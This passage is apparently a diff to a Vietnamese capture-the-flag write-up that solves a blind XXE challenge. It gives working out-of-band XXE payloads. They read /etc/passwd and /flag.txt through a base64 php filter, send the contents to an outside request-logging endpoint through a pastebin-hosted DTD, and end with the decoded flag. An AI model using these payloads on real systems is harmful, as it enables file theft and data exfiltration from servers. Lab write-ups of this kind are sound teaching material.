@@ -208,3 +208,41 @@ File stored on http://127.0.0.1/dtd.xml
 <!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
 <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://127.0.0.1/dtd.xml?%data;'>">
 ```
+
+Tiếp theo, sử dụng: https://requestinspector.com/ để tạo một endpoint, mình lấy được một url: https://requestinspector.com/p/01gpz57s2z8f9cgqvgkqgxqn44  => mỗi khi truy cập vào link này dữ liệu sẽ được ghi lại
+
+Tiếp theo tạo một pastebin với nội dung như sau:
+```xml
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'https://requestinspector.com/inspect/01gpz57s2z8f9cgqvgkqgxqn44?%data;'>">
+```
+=> đây là đừng dẫn của pastebin: https://pastebin.com/raw/TbthmPfv
+
+sau cùng,  thay thế payload trên với url pastbin vừa tạo.
+```
+<?xml version="1.0" ?>
+
+<!DOCTYPE r [
+
+<!ELEMENT r ANY >
+
+<!ENTITY % sp SYSTEM "https://pastebin.com/raw/TbthmPfv">
+
+%sp;
+
+%param1;
+
+]>
+
+<r>&exfil;</r>
+```
+
+![img](./images/9.png)
+
+status trả về là 1 nên có vẻ như đã chính xác, và bài này là một bài blind nên ta quay lại server để xem kết quả
+
+![img](./images/10.png)
+
+giải mã base64: V2VsbCBkb25lISwgaGVyZSBpcyB0aGUgZmxhZzogS0NTQ3tibGluZF94eERfeHhPX3h4XV94eGUhIUAjQH0K ta thu được flag
+
+flag: KCSC{blind_xxD_xxO_xx]_xxe!!@#@}
